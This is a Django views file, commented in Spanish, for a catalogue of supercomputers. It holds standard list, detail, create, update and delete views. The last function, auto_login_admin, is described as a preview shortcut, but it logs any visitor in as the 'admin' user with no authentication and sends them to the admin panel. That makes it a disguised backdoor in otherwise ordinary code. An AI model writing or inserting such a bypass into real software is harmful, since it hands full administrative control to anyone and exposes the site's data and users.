from django.shortcuts import render, get_object_or_404, redirect
from django.urls import reverse_lazy
from django.contrib import messages
from django.views.generic import (
    ListView,
    DetailView,
    CreateView,
    UpdateView,
    DeleteView,
)
from django.db.models import Sum, Avg, Max, Count
from .models import Supercomputadora
from .forms import SupercomputadoraForm


class SupercomputadoraListView(ListView):
    """
    Vista principal del catalogo: lista todos los registros y calcula
    totales acumulados de cores, rendimiento y almacenamiento directo en SQLite.
    """

    model = Supercomputadora
    template_name = "computadoras/lista.html"
    context_object_name = "supercomputadoras"

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        # Agregaciones a nivel de base de datos
        context["stats"] = Supercomputadora.objects.aggregate(
            total_equipos=Count("id"),
            total_cores=Sum("numero_cores"),
            total_ram=Sum("ram_tb"),
            total_almacenamiento=Sum("almacenamiento_tb"),
            total_teraflops=Sum("teraflops"),
            max_teraflops=Max("teraflops"),
        )
        return context


class SupercomputadoraDetailView(DetailView):
    """Muestra la ficha tecnica detallada de una supercomputadora especifica."""

    model = Supercomputadora
    template_name = "computadoras/detalle.html"
    context_object_name = "computadora"


class SupercomputadoraCreateView(CreateView):
    """Formulario para agregar un nuevo registro a la base de datos."""

    model = Supercomputadora
    form_class = SupercomputadoraForm
    template_name = "computadoras/formulario.html"
    success_url = reverse_lazy("computadoras:lista")

    def form_valid(self, form):
        messages.success(
            self.request,
            f"Supercomputadora '{form.cleaned_data['nombre']}' registrada con éxito.",
        )
        return super().form_valid(form)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["titulo_accion"] = "Registrar Supercomputadora"
        context["boton_texto"] = "Guardar Registro"
        context["icono_accion"] = "bi-plus-circle"
        return context


class SupercomputadoraUpdateView(UpdateView):
    """Formulario para editar especificaciones de un registro existente."""

    model = Supercomputadora
    form_class = SupercomputadoraForm
    template_name = "computadoras/formulario.html"
    success_url = reverse_lazy("computadoras:lista")

    def form_valid(self, form):
        messages.info(
            self.request,
            f"La información de '{form.cleaned_data['nombre']}' ha sido actualizada.",
        )
        return super().form_valid(form)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["titulo_accion"] = f"Editar: {self.object.nombre}"
        context["boton_texto"] = "Guardar Cambios"
        context["icono_accion"] = "bi-pencil-square"
        return context


class SupercomputadoraDeleteView(DeleteView):
    """Elimina el registro de la base de datos previa confirmacion del usuario."""

    model = Supercomputadora
    template_name = "computadoras/confirmar_eliminar.html"
    context_object_name = "computadora"
    success_url = reverse_lazy("computadoras:lista")

    def form_valid(self, form):
        nombre = self.object.nombre
        messages.warning(
            self.request,
            f"El registro de '{nombre}' fue eliminado de la base de datos.",
        )
        return super().form_valid(form)


def auto_login_admin(request):
    """Acceso directo de apoyo para previsualizar el panel administrativo."""
    from django.contrib.auth import login
    from django.contrib.auth.models import User
    user = User.objects.filter(username="admin").first()
    if user:
        login(request, user)
    return redirect("/admin/computadoras/supercomputadora/")
